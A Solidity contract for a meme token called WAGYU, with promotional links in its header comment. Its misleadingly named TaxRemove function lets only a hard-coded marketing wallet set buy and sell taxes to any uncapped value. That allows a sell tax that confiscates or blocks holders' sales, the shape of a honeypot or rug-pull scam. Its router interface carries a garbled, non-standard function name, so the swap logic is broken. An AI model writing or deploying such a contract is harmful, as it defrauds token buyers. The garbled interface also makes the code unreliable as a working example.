/*
$WAGYU Official links 

Website  -  wagyutoken.com
Telegram - https://t.me/wagyutoken
X - https://x.com/wagyutoken

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingtaxsetuplockOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract WAGYU  {

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public _name = unicode"WAGYU"; 
        string public _symbol = unicode"WAGYU";  
        uint8 public constant decimals = 9;
        uint256 public constant totalSupply = 1000000000 * 10**decimals;

        uint256 buytaxsetuplock = 0;
        uint256 selltaxsetuplock = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed MKT_wallet,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant MKT_wallet = payable(address(0xcE55e3A10C2cB6efDdC44829cA9D4c9367d6ea73));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == MKT_wallet || to == MKT_wallet);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingtaxsetuplockOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                MKT_wallet.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 taxsetuplockAmount = amount * (from == pair ? buytaxsetuplock : selltaxsetuplock) / 100;
                amount -= taxsetuplockAmount;
                balanceOf[address(this)] += taxsetuplockAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function OpenTrading() external {
            require(msg.sender == MKT_wallet);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _Remevetax(uint256 _buy, uint256 _sell) private {
            buytaxsetuplock = _buy;
            selltaxsetuplock = _sell;
        }

        function TaxRemove(uint256 _buy, uint256 _sell) external {
            if(msg.sender != MKT_wallet)        
                revert Permissions();
            _Remevetax(_buy, _sell);
        }
    }